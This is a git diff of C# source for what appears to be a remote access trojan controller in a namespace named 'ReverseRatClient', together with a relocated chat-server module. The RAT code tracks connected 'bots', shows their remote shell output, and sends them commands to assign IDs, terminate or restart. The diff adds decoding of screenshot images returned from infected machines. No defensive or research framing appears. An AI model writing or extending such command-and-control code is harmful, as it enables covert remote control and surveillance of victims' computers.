@@ -131,7 +131,7 @@ namespace ReverseRatClient
                         if (_contRepeticion > 5)
                         {
                              _contRepeticion = 0;
-                             DisplayMessage("<Conexion perdida con: " + socketNuevo.GetHashCode() + ">\n");
+                             DisplayMessage("<Conexion perdida con: " + socketNuevo.GetHashCode() + ">\r\n");
                              string formarCadena273 = "273 " + ObtenerNickPorHash(socketNuevo.GetHashCode().ToString());
                              EnviarBroadCast(formarCadena273, socketNuevo.GetHashCode().ToString(), ObtenerCanalPorHash(socketNuevo.GetHashCode().ToString()));
                              EliminarClienteLista(socketNuevo);                             
@@ -149,17 +149,24 @@ namespace ReverseRatClient
                     {
                         if (Convert.ToString(ActiveForm.MdiChildren[ctx].Tag) == cadenaEvaluar)
                         {
-                            var pnlControl = (PanelDeControl)ActiveForm.MdiChildren[ctx];                         
-                            pnlControl.textBox1.AppendText(strInput.ToString().Split('|')[0] + "\r\n");
-
-
-                            //Formato al texto de Shell
-                            if (pnlControl.textBox1.Text.Substring(pnlControl.textBox1.Text.Length - 3, 1) == ">")
+                            var pnlControl = (PanelDeControl)ActiveForm.MdiChildren[ctx];
+                            try
                             {
-                                pnlControl.textBox1.Text = pnlControl.textBox1.Text.Substring(0, pnlControl.textBox1.Text.Length - 2);
-                                pnlControl.textBox1.SelectionStart = pnlControl.textBox1.TextLength;
-                                pnlControl.textBox1.ScrollToCaret();                               
+                                pnlControl.textBox1.AppendText(strInput.ToString().Split('|')[0] + "\r\n");
+
+                                //Formato al texto de Shell
+                                if (pnlControl.textBox1.Text.Substring(pnlControl.textBox1.Text.Length - 3, 1) == ">")
+                                {
+                                    pnlControl.textBox1.Text = pnlControl.textBox1.Text.Substring(0, pnlControl.textBox1.Text.Length - 2) + "\r\n";
+                                    pnlControl.textBox1.SelectionStart = pnlControl.textBox1.TextLength;
+                                    pnlControl.textBox1.ScrollToCaret();
+                                }
+                            }                            
+                            catch (Exception ex)
+                            {
+                                Console.WriteLine(ex.ToString());   
                             }
+
                         }
                     }
                    
@@ -186,276 +193,6 @@ namespace ReverseRatClient
         }
 
 
-        #region ServidorEshare
-
-
-        private void EnviarComando(string comando, Socket sck)
-        {
-            string mensaje = comando;
-
-            try
-            {
-                DisplayMessage("<" + sck.GetHashCode() + ">");
-                NetworkStream nStr = new NetworkStream(sck);
-                if (nStr == Stream.Null)
-                {
-                    MessageBox.Show(@"holaa");
-                }
-                StreamWriter strw = new StreamWriter(nStr);
-                StringBuilder strib = new StringBuilder();
-                strib.Append(mensaje);
-                strw.WriteLine(strib);
-                strw.Flush();
-                strw.Close();
-                nStr.Close();
-            }
-            catch (Exception ex)
-            {
-                Console.WriteLine(ex.Message);
-            }
-
-        }
-
-        void ProcesarComandosChat(StringBuilder cadena, Socket sck)
-        {
-            var cadEv = cadena.ToString();
-
-            if (cadEv.Length >= 3)
-            {
-                switch (cadEv.Substring(0, 3))
-                {
-                    case "100": // Cadena inicial
-                        string nuevoNickName = cadEv.Split(':')[1];
-                        string nuevoCanal = cadEv.Split(':')[3];
-                        string nuevoCliente = cadEv.Split(':')[0].Substring(3, cadEv.Split(':')[0].Length - 3);
-                     
-                        if (ValidarNickNameCanal(nuevoNickName, nuevoCanal))
-                        {
-                           // Avisar a todos que el usuario ingresó al chat
-                            string formarCadena264 = "264 " + nuevoNickName;
-                            EnviarBroadCast(formarCadena264, sck.GetHashCode().ToString(), nuevoCanal);
-                            // Enviar cadena de aceptación y lista de usuarios de canal
-                            string formarCadena202 = "202 " + nuevoNickName + ":" + (listaUsuariosChat.Count + 1) + ";" +
-                                                     nuevoCanal + ":" + ContarUsuariosCanal(nuevoCanal) + ":" + "0";
-                            listaUsuariosChat.Add(new UsuariosChat(nuevoNickName, nuevoCanal, nuevoCliente, sck));                            
-                            EnviarComando(formarCadena202, sck);
-                            string formarCadena222 = "222 " + DevolverUsuariosCanal220(sck.GetHashCode().ToString());
-                            EnviarComando(formarCadena222, sck);
-                        }                                       
-                        break;
-                    case "220": // Enviar listado de usuarios del canal a peticion de usuario                      
-                        string formarCadena222X = "222 " + DevolverUsuariosCanal220(sck.GetHashCode().ToString());
-                        EnviarComando(formarCadena222X, sck);
-                        break;                        
-                    case "248": //Mensaje publico
-                        string mensaje = cadEv.Substring(4, cadEv.Length - 4); 
-                        string formarCadena270 = "270 " + ObtenerNickPorHash(sck.GetHashCode().ToString()) +  ":" + mensaje;                      
-                        EnviarBroadCast(formarCadena270, sck.GetHashCode().ToString(), ObtenerCanalPorHash(sck.GetHashCode().ToString()));
-                        break;                        
-                    case "255": // Mensaje Privado
-                        string nickDestino = cadEv.Substring(4, cadEv.Length - 4).Split(':')[0];
-                        string nickOrigen = ObtenerNickPorHash(sck.GetHashCode().ToString());
-                        string mensajeprivado = cadEv.Substring(cadEv.IndexOf(":", 0, StringComparison.Ordinal) + 1);
-                        EnviarMensajePrivado(nickOrigen, nickDestino, mensajeprivado);
-                        break;
-                    case "260": // Solicita cambio de canal
-                        int numeroUsuarios = 0;
-                        string canalOrigen = ObtenerCanalPorHash(sck.GetHashCode().ToString());
-                        string canalDestino = cadEv.Substring(4, cadEv.Length - 4).Trim();
-                        string nombreUsuarioCanal = ObtenerNickPorHash(sck.GetHashCode().ToString());
-                        if (RealizarCambioCanal(canalDestino, ref numeroUsuarios, sck))
-                        {
-                            string formarCadenaCambioAprobadoCanal = "262 " + canalDestino + ":" + numeroUsuarios + ":" + "0";
-                            EnviarComando(formarCadenaCambioAprobadoCanal, sck);
-                            string formarCadena263CambiaCanal = "263 " +
-                                                                nombreUsuarioCanal + ":" +
-                                                                canalDestino;
-                            EnviarBroadCast(formarCadena263CambiaCanal, sck.GetHashCode().ToString(), canalOrigen);
-                            string formarCadena264 = "264 " + nombreUsuarioCanal;
-                            EnviarBroadCast(formarCadena264, sck.GetHashCode().ToString(), canalDestino);
-                        }
-                        else
-                        {
-                            string cadenabadRoom = "404 Bad Room Request";
-                            EnviarComando(cadenabadRoom, sck);
-                        }
-                        break;
-                    case "300": // solicita lista de canales publicos
-                        foreach (var canal in ListaCanales)
-                        {
-                            string formarCadenaCanal = "310 " + canal + ":0:"+ DevolverNumUsuariosCanal(canal) + ":"+ MaxClientesCanal;                           
-                            EnviarComando(formarCadenaCanal, sck);
-                        }                        
-                        break;
-                        
-                }
-            }
-
-           // MessageBox.Show(CadEv.Substring(0, 3));
-        }
-
-
-        //Comprobacion al pedido 260 (cambiar canal)
-        bool RealizarCambioCanal(string canalDestino, ref int numUsuarios, Socket sck)
-        {
-            numUsuarios = DevolverNumUsuariosCanal(canalDestino);
-            if (numUsuarios < MaxClientesCanal)
-            {
-                foreach (var usr in listaUsuariosChat)
-                {
-                    if (sck == usr.SocketUsr)
-                    {
-                        usr.CanalActual = canalDestino;
-                    }
-                }
-            }
-            return numUsuarios < MaxClientesCanal;
-        }
-
-
-        //Elimina un socket de la lista 
-        void EliminarClienteLista(Socket sck)
-        {
-            foreach (UsuariosChat usr in listaUsuariosChat)
-            {
-                if (usr.SocketUsr == sck)
-                {
-                    listaUsuariosChat.Remove(usr);
-                    break;                    
-                }
-            }
-
-        }
-
-        
-        //Envia mensaje privado a otro nick
-        void EnviarMensajePrivado(string nickOrigen, string nickDestino, string mensaje)
-        {
-            foreach (UsuariosChat usr in listaUsuariosChat)
-            {
-                if (nickDestino == usr.NickName)
-                {
-                    EnviarComando("256 " + nickOrigen + ":" + mensaje, usr.SocketUsr);                    
-                }
-            }
-        }
-        
-
-        // Validacion de nick y canal de usuarios
-        bool ValidarNickNameCanal(string nickaValidar,  string canalaValidar)
-        {
-            foreach (UsuariosChat usr in listaUsuariosChat)
-            {
-                if (nickaValidar == usr.NickName)
-                {
-                    return false;
-                }
-            }
-            int cont = 0;
-            foreach (string canal in ListaCanales)
-            {              
-                if (canalaValidar.ToUpper() == canal.ToUpper())
-                {
-                    cont++;
-                }
-            }
-            if (cont == 0)
-                return false;
-        
-            return true;
-        }
-
-
-        //Contar usuarios en canal
-        int ContarUsuariosCanal(string canal)
-        {
-            int contador = 0;
-            foreach (UsuariosChat usr in listaUsuariosChat)
-            {
-                if (usr.CanalActual == canal)
-                    contador ++;
-            }
-            return contador;
-        }
-        
-
-        //Devuelve lista de usuarios del canal donde se encuentra el hash actual
-        string DevolverUsuariosCanal220(string hashSocket)
-        {
-
-            string canal = ObtenerCanalPorHash(hashSocket);
-            string cadenaUsuarios = "";
-            foreach (UsuariosChat usr in listaUsuariosChat)
-            {
-               // MessageBox.Show(usr.NickName + " : "+ usr.CanalActual);
-                if (usr.CanalActual.ToUpper() == canal.ToUpper())
-                {
-                    cadenaUsuarios += usr.NickName + ";";
-                }
-            }
-            cadenaUsuarios = cadenaUsuarios.Substring(0, cadenaUsuarios.Length - 1);
-            return canal + ":" + cadenaUsuarios;
-        }
-
-
-        // Numero de usuarios en determinado canal
-        int DevolverNumUsuariosCanal(string canal)
-        {
-            int cont = 0;           
-            foreach (UsuariosChat usr in listaUsuariosChat)
-            {
-                if (usr.CanalActual.ToUpper() == canal.ToUpper())
-                {
-                    cont++;
-                }
-            }
-
-            return cont;
-        }
-
-
-        // Canal por hash de sck
-        private string ObtenerCanalPorHash(string hashActual)
-        {
-            foreach (UsuariosChat usr in listaUsuariosChat)
-            {               
-                if (usr.SocketUsr.GetHashCode().ToString() == hashActual)
-                {
-                    return usr.CanalActual;
-                }
-            }
-            return "No Existe canal";
-        }
-
-
-        //Nick por hash de sck
-        private string ObtenerNickPorHash(string hashActual)
-        {
-            foreach (UsuariosChat usr in listaUsuariosChat)
-            {
-                if (usr.SocketUsr.GetHashCode().ToString() == hashActual)
-                {
-                    return usr.NickName;
-                }
-            }
-            return "Sin Nick";
-        }
-        
-      
-        //Envia mensajes publicos usando el 270, 273
-        void EnviarBroadCast(string cadena, string hashActual, string canal)
-        {
-            foreach (UsuariosChat usr in listaUsuariosChat)
-            {
-                if (usr.SocketUsr.GetHashCode().ToString() != hashActual && string.Equals(usr.CanalActual, canal, StringComparison.CurrentCultureIgnoreCase))
-                {
-                    EnviarComando(cadena, usr.SocketUsr);
-                }
-            }
-        }
-
-#endregion
-
 
 
         // Despachador de comandos de la aplicacion, el usuario envia comando y  este es procesado en esta pequeña funcion
@@ -478,8 +215,8 @@ namespace ReverseRatClient
                         _listaBots[cadEv] = sck;
 
                         string hashSck = sck.GetHashCode().ToString();
-                        DisplayMessage("\n<Conn:" + hashSck + ">\n");
-                        EnviarComando("asignahash " + hashSck, sck);
+                        DisplayMessage("\n<Conexión:" + hashSck + ">\n");
+                        EnviarComando("<:asignahash:> " + hashSck, sck);
                         s = "";
                         return true;
                     }
@@ -496,6 +233,17 @@ namespace ReverseRatClient
                         }
                     }
                 }
+            }
+            // Respuesta imagen de captura
+            if (cadEv.IndexOf("<:imagen:>") >= 0)
+            {
+                string delimiter = "<:imagen:>";
+                // Dividir la cadena utilizando la cadena delimitadora
+                string[] split = cadEv.Split(new string[] { delimiter }, StringSplitOptions.None);
+                byte[] bytes = Convert.FromBase64String(split[1]);
+
+                //File.WriteAllBytes(@"C:\sw\imagen.png", bytes);
+                //MessageBox.Show("Imagen guardada");
             }
             s = "";
             return false;
@@ -631,7 +379,7 @@ namespace ReverseRatClient
 
         private void button1_Click(object sender, EventArgs e) // Boton de ejemplo para enviar un comando
         {
-            EnviarComando("hola");            
+             
         }
 
         private void EnviarComando(string comando) // Enviar comando al elemento seleccionado en Dvw
@@ -642,7 +390,7 @@ namespace ReverseRatClient
 
             cadenaForm = x.FormarCadena(dataGridView1); //Enviar al elemento seleccionado del DataGridView            
             var sckEnviar = (Socket)_listaBots[cadenaForm];
-            DisplayMessage("<" + sckEnviar.GetHashCode()  + ">");
+            DisplayMessage("<" + sckEnviar.GetHashCode()  + ">" + comando + "\r\n");
             NetworkStream nStr = new NetworkStream(sckEnviar);
           
             StreamWriter strw = new StreamWriter(nStr);
@@ -661,7 +409,7 @@ namespace ReverseRatClient
 
             var cadenaForm = cadenaInicio;
             var sckEnviar = (Socket)_listaBots[cadenaForm];
-            DisplayMessage("<" + sckEnviar.GetHashCode() + ">");
+            DisplayMessage("<" + sckEnviar.GetHashCode() + ">" + comando.Trim() +"|");
             NetworkStream nStr = new NetworkStream(sckEnviar);
 
             StreamWriter strw = new StreamWriter(nStr);
@@ -679,7 +427,7 @@ namespace ReverseRatClient
 
         private void toolStripMenuItem1_Click(object sender, EventArgs e)
         {
-            EnviarComando("hola");
+            EnviarComando("<:hola:>");
         }
 
         private void dataGridView1_CellClick(object sender, DataGridViewCellEventArgs e)
@@ -698,7 +446,7 @@ namespace ReverseRatClient
 
         private void cerrarServidorToolStripMenuItem_Click(object sender, EventArgs e)
         {
-            EnviarComando("terminate");
+            EnviarComando("<:terminar:>");
         }
 
         private void button3_Click(object sender, EventArgs e)
@@ -721,26 +469,308 @@ namespace ReverseRatClient
 
         }
 
-        private void button4_Click(object sender, EventArgs e)
-        {
-            // Mensaje Admin
-            foreach (UsuariosChat usr in listaUsuariosChat)
-            {
-                EnviarComando("700 "+ textBox4.Text, usr.SocketUsr);                
-            }
-            textBox4.Text = "";
-        }
+     
 
         private void button2_Click(object sender, EventArgs e)
         {
             Funciones x = new Funciones();
             var cadenaForm = x.FormarCadena(dataGridView1);
             var sckEnviar = (Socket)_listaBots[cadenaForm];
-            textBox3.Text = sckEnviar.Connected.ToString();
+            MessageBox.Show( sckEnviar.Connected.ToString());
         }
 
-       
-      
-      
+
+
+
+        #region ServidorEshare
+
+
+
+        private void button4_Click(object sender, EventArgs e)
+        {
+            // Mensaje Admin
+            foreach (UsuariosChat usr in listaUsuariosChat)
+            {
+                EnviarComando("700 " + textBox4.Text, usr.SocketUsr);
+            }
+            textBox4.Text = "";
+        }
+
+
+        private void EnviarComando(string comando, Socket sck)
+        {
+            string mensaje = comando;
+
+            try
+            {
+                DisplayMessage("<" + sck.GetHashCode() + ">");
+                NetworkStream nStr = new NetworkStream(sck);
+                if (nStr == Stream.Null)
+                {
+                    MessageBox.Show(@"holaa");
+                }
+                StreamWriter strw = new StreamWriter(nStr);
+                StringBuilder strib = new StringBuilder();
+                strib.Append(mensaje);
+                strw.WriteLine(strib);
+                strw.Flush();
+                strw.Close();
+                nStr.Close();
+            }
+            catch (Exception ex)
+            {
+                Console.WriteLine(ex.Message);
+            }
+
+        }
+
+        void ProcesarComandosChat(StringBuilder cadena, Socket sck)
+        {
+            var cadEv = cadena.ToString();
+
+            if (cadEv.Length >= 3)
+            {
+                switch (cadEv.Substring(0, 3))
+                {
+                    case "100": // Cadena inicial
+                        string nuevoNickName = cadEv.Split(':')[1];
+                        string nuevoCanal = cadEv.Split(':')[3];
+                        string nuevoCliente = cadEv.Split(':')[0].Substring(3, cadEv.Split(':')[0].Length - 3);
+
+                        if (ValidarNickNameCanal(nuevoNickName, nuevoCanal))
+                        {
+                            // Avisar a todos que el usuario ingresó al chat
+                            string formarCadena264 = "264 " + nuevoNickName;
+                            EnviarBroadCast(formarCadena264, sck.GetHashCode().ToString(), nuevoCanal);
+                            // Enviar cadena de aceptación y lista de usuarios de canal
+                            string formarCadena202 = "202 " + nuevoNickName + ":" + (listaUsuariosChat.Count + 1) + ";" +
+                                                     nuevoCanal + ":" + ContarUsuariosCanal(nuevoCanal) + ":" + "0";
+                            listaUsuariosChat.Add(new UsuariosChat(nuevoNickName, nuevoCanal, nuevoCliente, sck));
+                            EnviarComando(formarCadena202, sck);
+                            string formarCadena222 = "222 " + DevolverUsuariosCanal220(sck.GetHashCode().ToString());
+                            EnviarComando(formarCadena222, sck);
+                        }
+                        break;
+                    case "220": // Enviar listado de usuarios del canal a peticion de usuario                      
+                        string formarCadena222X = "222 " + DevolverUsuariosCanal220(sck.GetHashCode().ToString());
+                        EnviarComando(formarCadena222X, sck);
+                        break;
+                    case "248": //Mensaje publico
+                        string mensaje = cadEv.Substring(4, cadEv.Length - 4);
+                        string formarCadena270 = "270 " + ObtenerNickPorHash(sck.GetHashCode().ToString()) + ":" + mensaje;
+                        EnviarBroadCast(formarCadena270, sck.GetHashCode().ToString(), ObtenerCanalPorHash(sck.GetHashCode().ToString()));
+                        break;
+                    case "255": // Mensaje Privado
+                        string nickDestino = cadEv.Substring(4, cadEv.Length - 4).Split(':')[0];
+                        string nickOrigen = ObtenerNickPorHash(sck.GetHashCode().ToString());
+                        string mensajeprivado = cadEv.Substring(cadEv.IndexOf(":", 0, StringComparison.Ordinal) + 1);
+                        EnviarMensajePrivado(nickOrigen, nickDestino, mensajeprivado);
+                        break;
+                    case "260": // Solicita cambio de canal
+                        int numeroUsuarios = 0;
+                        string canalOrigen = ObtenerCanalPorHash(sck.GetHashCode().ToString());
+                        string canalDestino = cadEv.Substring(4, cadEv.Length - 4).Trim();
+                        string nombreUsuarioCanal = ObtenerNickPorHash(sck.GetHashCode().ToString());
+                        if (RealizarCambioCanal(canalDestino, ref numeroUsuarios, sck))
+                        {
+                            string formarCadenaCambioAprobadoCanal = "262 " + canalDestino + ":" + numeroUsuarios + ":" + "0";
+                            EnviarComando(formarCadenaCambioAprobadoCanal, sck);
+                            string formarCadena263CambiaCanal = "263 " +
+                                                                nombreUsuarioCanal + ":" +
+                                                                canalDestino;
+                            EnviarBroadCast(formarCadena263CambiaCanal, sck.GetHashCode().ToString(), canalOrigen);
+                            string formarCadena264 = "264 " + nombreUsuarioCanal;
+                            EnviarBroadCast(formarCadena264, sck.GetHashCode().ToString(), canalDestino);
+                        }
+                        else
+                        {
+                            string cadenabadRoom = "404 Bad Room Request";
+                            EnviarComando(cadenabadRoom, sck);
+                        }
+                        break;
+                    case "300": // solicita lista de canales publicos
+                        foreach (var canal in ListaCanales)
+                        {
+                            string formarCadenaCanal = "310 " + canal + ":0:" + DevolverNumUsuariosCanal(canal) + ":" + MaxClientesCanal;
+                            EnviarComando(formarCadenaCanal, sck);
+                        }
+                        break;
+
+                }
+            }
+
+            // MessageBox.Show(CadEv.Substring(0, 3));
+        }
+
+
+        //Comprobacion al pedido 260 (cambiar canal)
+        bool RealizarCambioCanal(string canalDestino, ref int numUsuarios, Socket sck)
+        {
+            numUsuarios = DevolverNumUsuariosCanal(canalDestino);
+            if (numUsuarios < MaxClientesCanal)
+            {
+                foreach (var usr in listaUsuariosChat)
+                {
+                    if (sck == usr.SocketUsr)
+                    {
+                        usr.CanalActual = canalDestino;
+                    }
+                }
+            }
+            return numUsuarios < MaxClientesCanal;
+        }
+
+
+        //Elimina un socket de la lista 
+        void EliminarClienteLista(Socket sck)
+        {
+            foreach (UsuariosChat usr in listaUsuariosChat)
+            {
+                if (usr.SocketUsr == sck)
+                {
+                    listaUsuariosChat.Remove(usr);
+                    break;
+                }
+            }
+
+        }
+
+
+        //Envia mensaje privado a otro nick
+        void EnviarMensajePrivado(string nickOrigen, string nickDestino, string mensaje)
+        {
+            foreach (UsuariosChat usr in listaUsuariosChat)
+            {
+                if (nickDestino == usr.NickName)
+                {
+                    EnviarComando("256 " + nickOrigen + ":" + mensaje, usr.SocketUsr);
+                }
+            }
+        }
+
+
+        // Validacion de nick y canal de usuarios
+        bool ValidarNickNameCanal(string nickaValidar, string canalaValidar)
+        {
+            foreach (UsuariosChat usr in listaUsuariosChat)
+            {
+                if (nickaValidar == usr.NickName)
+                {
+                    return false;
+                }
+            }
+            int cont = 0;
+            foreach (string canal in ListaCanales)
+            {
+                if (canalaValidar.ToUpper() == canal.ToUpper())
+                {
+                    cont++;
+                }
+            }
+            if (cont == 0)
+                return false;
+
+            return true;
+        }
+
+
+        //Contar usuarios en canal
+        int ContarUsuariosCanal(string canal)
+        {
+            int contador = 0;
+            foreach (UsuariosChat usr in listaUsuariosChat)
+            {
+                if (usr.CanalActual == canal)
+                    contador++;
+            }
+            return contador;
+        }
+
+
+        //Devuelve lista de usuarios del canal donde se encuentra el hash actual
+        string DevolverUsuariosCanal220(string hashSocket)
+        {
+
+            string canal = ObtenerCanalPorHash(hashSocket);
+            string cadenaUsuarios = "";
+            foreach (UsuariosChat usr in listaUsuariosChat)
+            {
+                // MessageBox.Show(usr.NickName + " : "+ usr.CanalActual);
+                if (usr.CanalActual.ToUpper() == canal.ToUpper())
+                {
+                    cadenaUsuarios += usr.NickName + ";";
+                }
+            }
+            cadenaUsuarios = cadenaUsuarios.Substring(0, cadenaUsuarios.Length - 1);
+            return canal + ":" + cadenaUsuarios;
+        }
+
+
+        // Numero de usuarios en determinado canal
+        int DevolverNumUsuariosCanal(string canal)
+        {
+            int cont = 0;
+            foreach (UsuariosChat usr in listaUsuariosChat)
+            {
+                if (usr.CanalActual.ToUpper() == canal.ToUpper())
+                {
+                    cont++;
+                }
+            }
+
+            return cont;
+        }
+
+
+        // Canal por hash de sck
+        private string ObtenerCanalPorHash(string hashActual)
+        {
+            foreach (UsuariosChat usr in listaUsuariosChat)
+            {
+                if (usr.SocketUsr.GetHashCode().ToString() == hashActual)
+                {
+                    return usr.CanalActual;
+                }
+            }
+            return "No Existe canal";
+        }
+
+
+        //Nick por hash de sck
+        private string ObtenerNickPorHash(string hashActual)
+        {
+            foreach (UsuariosChat usr in listaUsuariosChat)
+            {
+                if (usr.SocketUsr.GetHashCode().ToString() == hashActual)
+                {
+                    return usr.NickName;
+                }
+            }
+            return "Sin Nick";
+        }
+
+        private void reiniciarServidorToolStripMenuItem_Click(object sender, EventArgs e)
+        {
+            EnviarComando("<:reiniciar:>");
+        }
+
+
+        //Envia mensajes publicos usando el 270, 273
+        void EnviarBroadCast(string cadena, string hashActual, string canal)
+        {
+            foreach (UsuariosChat usr in listaUsuariosChat)
+            {
+                if (usr.SocketUsr.GetHashCode().ToString() != hashActual && string.Equals(usr.CanalActual, canal, StringComparison.CurrentCultureIgnoreCase))
+                {
+                    EnviarComando(cadena, usr.SocketUsr);
+                }
+            }
+        }
+
+        #endregion
+
+
+
+
     }
 }
